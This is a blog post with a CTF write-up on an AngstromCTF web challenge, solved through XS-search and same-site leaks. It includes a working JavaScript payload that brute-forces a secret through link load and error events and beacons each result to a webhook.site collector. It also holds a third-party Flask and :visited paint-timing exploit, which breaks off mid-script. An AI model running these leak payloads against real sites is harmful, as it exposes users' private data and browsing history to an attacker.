<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

 


      <title>WaterMark as a Service AngstromCTF - Alfin&#39;s Notes</title>

  <meta name="description" content="tl;dr

XS-search 200 / 404 .
Leaking using HTML injection in a same-site challenge.
Link tags and Error events .
">
  <meta name="author" content="Alfin Joseph"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "Alfins Notes",
    
    "url": "https:\/\/Alfinj0se.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/Alfinj0se.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/Alfinj0se.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/Alfinj0se.github.io\/posts\/angstromctf2024\/",
          "name": "Water mark as a service angstrom ctf"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "Alfin Joseph"
  },
  "headline": "WaterMark as a Service AngstromCTF",
  "description" : "tl;dr\nXS-search 200 \/ 404 . Leaking using HTML injection in a same-site challenge. Link tags and Error events . ",
  "inLanguage" : "en",
  "wordCount":  1336 ,
  "datePublished" : "2024-05-26T21:01:42\u002b05:30",
  "dateModified" : "2024-05-26T21:01:42\u002b05:30",
  "image" : "https:\/\/Alfinj0se.github.io\/img\/pfp.jpg",
  "keywords" : [ "writeups" ],
  "mainEntityOfPage" : "https:\/\/Alfinj0se.github.io\/posts\/angstromctf2024\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/Alfinj0se.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/Alfinj0se.github.io\/img\/pfp.jpg",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="WaterMark as a Service AngstromCTF" />
<meta property="og:description" content="tl;dr

XS-search 200 / 404 .
Leaking using HTML injection in a same-site challenge.
Link tags and Error events .
">
<meta property="og:image" content="https://Alfinj0se.github.io/img/pfp.jpg" />
<meta property="og:url" content="https://Alfinj0se.github.io/posts/angstromctf2024/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="Alfins Notes" />

  <meta name="twitter:title" content="WaterMark as a Service AngstromCTF" />
  <meta name="twitter:description" content="tl;dr

XS-search 200 / 404 .
Leaking using HTML injection in a same-site challenge.
Link tags and Error events .
">
  <meta name="twitter:image" content="https://Alfinj0se.github.io/img/pfp.jpg" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:site" content="@Alfinjoseph19" />
  <meta name="twitter:creator" content="@Alfinjoseph19" />
  <link href='https://Alfinj0se.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.126.1">
  <link rel="alternate" href="https://Alfinj0se.github.io/index.xml" type="application/rss+xml" title="Alfins Notes"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css" integrity="sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous"><link rel="stylesheet" href="https://Alfinj0se.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://Alfinj0se.github.io/css/syntax.css" /><link rel="stylesheet" href="https://Alfinj0se.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">

  


  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://Alfinj0se.github.io/">Alfins Notes</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Blog" href="/">Blog</a>
            </li>
          
        
          
            <li>
              <a title="About" href="/page/about/">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="Alfins Notes" href="https://Alfinj0se.github.io/">
            <img class="avatar-img" src="https://Alfinj0se.github.io/img/pfp.jpg" alt="Alfins Notes" />
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="posts-heading">
              
                <h1>WaterMark as a Service AngstromCTF</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <p><strong>tl;dr</strong></p>
<ul>
<li>XS-search 200 / 404 .</li>
<li>Leaking using HTML injection in a same-site challenge.</li>
<li>Link tags and Error events .</li>
</ul>
<h2 id="-initial-analysis">üîé Initial analysis</h2>
<p>We are given the application source code and a challenge link. Also, there is a <code>waaas.js</code> for the admin bot. Looking at the application, the main functionality was the search endpoint.</p>
<p>Taking a look at the code for /search endpoint in the <code>index.js</code> file.</p>
<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>app.get(<span style="color:#5af78e">&#39;/search&#39;</span>, (req, res) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#ff6ac1">if</span> (req.cookies[<span style="color:#5af78e">&#39;admin_cookie&#39;</span>] <span style="color:#ff6ac1">!==</span> secretvalue) {
</span></span><span style="display:flex;"><span>		res.status(<span style="color:#ff9f43">403</span>).send(<span style="color:#5af78e">&#34;Unauthorized&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff6ac1">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff6ac1">try</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#ff5c57">let</span> query <span style="color:#ff6ac1">=</span> req.query.q;
</span></span><span style="display:flex;"><span>		<span style="color:#ff6ac1">for</span> (<span style="color:#ff5c57">let</span> flag <span style="color:#ff6ac1">of</span> flags) {
</span></span><span style="display:flex;"><span>			<span style="color:#ff6ac1">if</span> (flag.indexOf(query) <span style="color:#ff6ac1">!==</span> <span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>) {
</span></span><span style="display:flex;"><span>				res.status(<span style="color:#ff9f43">200</span>).send(<span style="color:#5af78e">&#34;Found&#34;</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#ff6ac1">return</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		res.status(<span style="color:#ff9f43">404</span>).send(<span style="color:#5af78e">&#34;Not Found&#34;</span>);
</span></span><span style="display:flex;"><span>	} <span style="color:#ff6ac1">catch</span> (e) {
</span></span><span style="display:flex;"><span>		console.log(e);
</span></span><span style="display:flex;"><span>		res.sendStatus(<span style="color:#ff9f43">500</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></td></tr></table>
</div>
</div><p>It was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.</p>
<h2 id="-attack-plan">ü•∑ Attack plan</h2>
<p>Since we cant directly access the /search enpoint we have to somehow make the admin send those requests. One approach is to get XSS anywhere in the site so we can send fetch requests bruteforce the flag. But unfortunately there is no XSS in this site.</p>
<p>The Next approach would be an <strong>XS-Search</strong> attack to leak the flag . As the bot is visiting any url we give it. In the /search enpoint if the query is a valid substring of the flag it was returning <strong>200 Found</strong> and if its not a valid substring it was returning <strong>404 Not Found</strong>.</p>
<p>We can use <a href="https://https://xsleaks.dev/docs/attacks/error-events/">Error Events</a> to differntiate between these 2 status codes cross site .</p>
<p>But there is another issue . . . . . <strong>Same Site Cookies!!</strong> . Looking the admin bots source code we can see that the admin cookie is <strong>same-site Lax</strong> .</p>
<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> cookie <span style="color:#ff6ac1">=</span> {
</span></span><span style="display:flex;"><span>                domain<span style="color:#ff6ac1">:</span> domain,
</span></span><span style="display:flex;"><span>                name<span style="color:#ff6ac1">:</span> <span style="color:#5af78e">&#34;admin_cookie&#34;</span>,
</span></span><span style="display:flex;"><span>                value<span style="color:#ff6ac1">:</span> key,
</span></span><span style="display:flex;"><span>                httpOnly<span style="color:#ff6ac1">:</span> <span style="color:#ff6ac1">true</span>,
</span></span><span style="display:flex;"><span>                secure<span style="color:#ff6ac1">:</span> <span style="color:#ff6ac1">true</span>,
</span></span><span style="display:flex;"><span>                sameSite<span style="color:#ff6ac1">:</span> <span style="color:#5af78e">&#39;Lax&#39;</span>
</span></span><span style="display:flex;"><span>    };
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the cookies won&rsquo;t be sent on the  requests which are sent from our hosted exploit as it wont be same-site üòì.</p>
<h2 id="samesite-leaks-ftw--">SameSite Leaks ftw  üåü</h2>
<p>If we have XSS or HTML injection in any domain which is same-site to the challenge domain we can use that in our favour for <a href="https://https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">Same Site Leaks</a>.</p>
<p>The challenge was hosted on <code>https://wwwwwwwwaas.web.actf.co/</code> and all other challenges was were subdomains of <code>web.actf.co</code> and fortunately we had XSS on <code>markdown.web.actf.co</code> which is <strong>same-site</strong>.</p>
<p>So now we can host our exploit to leak the flag on <code>markdown.web.actf.co</code>
.
We can use a script,link tags to determine if it was <strong>200</strong> or <strong>404</strong> .Because if the response is <strong>200</strong> the <strong>onload</strong> event handler will be fired and if the response is <strong>404</strong> the <strong>onerror</strong> handler will be fired .</p>
<h2 id="-final-payloads">üöÄ Final Payloads</h2>
<div class="highlight"><div style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> charset <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">let</span> found <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;actf&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> leak_url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">const</span> next <span style="color:#ff6ac1">=</span> (i) =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#ff6ac1">char</span> <span style="color:#ff6ac1">=</span> charset[i]
</span></span><span style="display:flex;"><span>      link <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">document</span>.createElement(<span style="color:#5af78e">&#34;link&#34;</span>)
</span></span><span style="display:flex;"><span>      link.rel <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;stylesheet&#34;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff5c57">document</span>.head.appendChild(link)
</span></span><span style="display:flex;"><span>      link.onload <span style="color:#ff6ac1">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>           found <span style="color:#ff6ac1">+=</span> charset[i]
</span></span><span style="display:flex;"><span>           navigator.sendBeacon(leak_url,JSON.stringify({type<span style="color:#ff6ac1">:</span> <span style="color:#5af78e">&#34;success&#34;</span>, found<span style="color:#ff6ac1">:</span>found,<span style="color:#ff6ac1">char</span><span style="color:#ff6ac1">:</span>charset[i] }))
</span></span><span style="display:flex;"><span>           next(<span style="color:#ff9f43">0</span>)
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       link.onerror <span style="color:#ff6ac1">=</span> () =&gt; {
</span></span><span style="display:flex;"><span>           next(i<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">1</span>)
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>       link.href <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34;</span><span style="color:#ff6ac1">+</span>found<span style="color:#ff6ac1">+</span>charset[i]
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>next(<span style="color:#ff9f43">0</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="-flag">üö© Flag</h2>
<p><code>actf{the_w_watermarks_the_whereabouts}</code></p>
<h2 id="-intended-solution">ü§Ø Intended solution</h2>
<p>This was actually not the solution, this leak worked only because the headless chrome used on the admin bot was outdated. In the new chrome this won&rsquo;t work due to <a href="https://github.com/annevk/orb">ORB</a>.</p>
<p>ORB will prevent the onload handler from being triggered if the content type of the requested resource is diffrent from the inclusion method. So since we are using a script tag here to load the response of a <strong>text/html</strong> content type it wont get loaded.</p>
<p>So we can&rsquo;t use script,link stylesheets etc for leaking as there will be a <strong>content-type mismatch</strong> for the request resource.</p>
<p>The intended solution was to use <strong>Complicated CSS effects</strong> and <strong>:visited selector</strong> to leak browser history through <strong>paint timing</strong> .It was a <a href="https://issues.chromium.org/issues/40091173">chromium bug</a> which was marked as won&rsquo;t fix .</p>
<p>This was the exploit for it shared by <a href="https://x.com/ixSly">@ixSly</a>.</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">import os
from flask import Flask, render_template_string, request

app = Flask(__name__)
URL = &#34;http://127.0.0.1:21111/&#34;
CHARSET = &#34;1234567890&#34; # for local testing 
#CHARSET = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;
ex_html = &#39;&#39;&#39;
&lt;!DOCTYPE html&gt;
&lt;html lang=&#34;en&#34;&gt;
&lt;head&gt;
    &lt;meta charset=&#34;UTF-8&#34;&gt;
    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
    &lt;title&gt;XS-Leak Test&lt;/title&gt;
    &lt;style type=&#34;text/css&#34;&gt;
        /* Set it up so the target link element has different colors when pointing to a
           visited vs unvisited URL. */
        #target {
            color: white;
            background-color: white;
            outline-color: white;
        }
        #target:visited {
            color: #feffff;
            background-color: #fffeff;
            outline-color: #fffffe;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
    async function isVisited(url) {
        let pocw = window.open(`/poc?url=${encodeURIComponent(url)}`, &#39;poc&#39;);
        pocw.focus();
    }

    // Extract the fragment identifier from the URL
    let hash = window.location.hash.substring(1) || &#34;flag{g68r|a&#34;;
    let [guess, current_guess] = hash.split(&#39;|&#39;);
    let base_url = &#39;{{CHALLENGE_URL}}search?q=flag{&#39;; //change based on flag format
    let charset = &#39;{{ CHARSET }}&#39;.split(&#39;&#39;);

    async function exploit(current_guess) {
        let w = open(`${base_url}${guess}${current_guess}`, &#39;guess&#39;);
        await new Promise((resolve) =&gt; setTimeout(resolve, 1000));
        w.close();
        isVisited(`${base_url}${guess}${current_guess}`);
    }
    exploit(current_guess);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&#39;&#39;&#39;

poc_html = &#39;&#39;&#39;
&lt;!doctype html&gt;
&lt;html lang=&#34;en&#34;&gt;
&lt;head&gt;
    &lt;meta charset=&#34;utf-8&#34;/&gt;
    &lt;style type=&#34;text/css&#34;&gt;
        #target {
            color: white;
            background-color: white;
            outline-color: white;
        }
        #target:visited {
            color: #feffff;
            background-color: #fffeff;
            outline-color: #fffffe;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div id=&#34;entryDisplay&#34;&gt;
        Enter a URL to test for visited status:
        &lt;input id=&#34;urlInput&#34; type=&#34;text&#34; size=&#34;60&#34; value=&#34;{{ url }}&#34; autofocus/&gt;
        &lt;button id=&#34;testButton&#34;&gt;Test&lt;/button&gt;
    &lt;/div&gt;
    &lt;script type=&#34;text/javascript&#34;&gt;
        (function () {
            var entryDisplay = document.getElementById(&#39;entryDisplay&#39;);
            var urlInput = document.getElementById(&#39;urlInput&#39;);
            var testButton = document.getElementById(&#39;testButton&#39;);
            
            var basisUrl;
            var controlUrl;
            var experimentUrl;
            
            var targetLink;
            var controlTickCount;

            function generateUnvisitedUrl () {
                return &#39;https://&#39; + Math.random() + &#39;/&#39; + Date.now();
            }
            
            testButton.addEventListener(&#39;click&#39;, function () {
                basisUrl = generateUnvisitedUrl();
                controlUrl = generateUnvisitedUrl();
                experimentUrl = urlInput.value;
                console.log({ experimentUrl })
                entryDisplay.remove();
                
                document.body.style.overflow = &#39;hidden&#39;;
                
                targetLink = document.createElement(&#39;a&#39;);
                targetLink.id = &#39;target&#39;;
                targetLink.href = basisUrl;
                
                var garbageText = &#39;Ê•≠Èõ≤Â§öÂèóÁâá‰∏ª...&#39;.repeat(28);
                targetLink.appendChild(document.createTextNode(garbageText));
                
                targetLink.style.display = &#39;block&#39;;
                targetLink.style.width = &#39;5px&#39;;
                targetLink.style.fontSize = &#39;2px&#39;;
                targetLink.style.outlineWidth = &#39;24px&#39;;
                targetLink.style.textAlign = &#39;center&#39;;
                targetLink.style.filter =
                    &#39;contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%)&#39;;
                targetLink.style.textShadow = &#39;16px 16px 10px #fefffe&#39;;
                targetLink.style.transform = &#39;perspective(100px) rotateY(37deg)&#39;;
                
                document.body.appendChild(targetLink);
                
                requestAnimationFrame(function () {
                    requestAnimationFrame(function () {
                        runTestStage(false);
                    });
                });
            });
            
            function runTestStage (isExperimentStage) {
                var testUrl = isExperimentStage ? experimentUrl : controlUrl;
                startCountingTicks();
                startOscillatingHref(testUrl);
                
                setTimeout(async function () {
                    stopOscillatingHref();
                    
                    if (!isExperimentStage) {
                        controlTickCount = stopCountingTicks();
                        runTestStage(true);
                        return;
                    }
                    
                    var experimentTickCount = stopCountingTicks();
                    targetLink.remove();
                    
                    var ratio = experimentTickCount / controlTickCount;
                    console.log(&#34;RATIO&#34;, experimentTickCount, controlTickCount, ratio)
                    var likelyVisited = ratio &lt; 0.7;
                   
                    async function sendBeacon(cond){
                        let url = opener ? opener.location.hash.substring(1) : &#34;flag{g68r|a&#34;;
                        let [guess, current_guess] = url.split(&#39;|&#39;);
                        if(cond){
                            await fetch(`/leak?flag=${guess}${current_guess}`);
                            if (opener) {
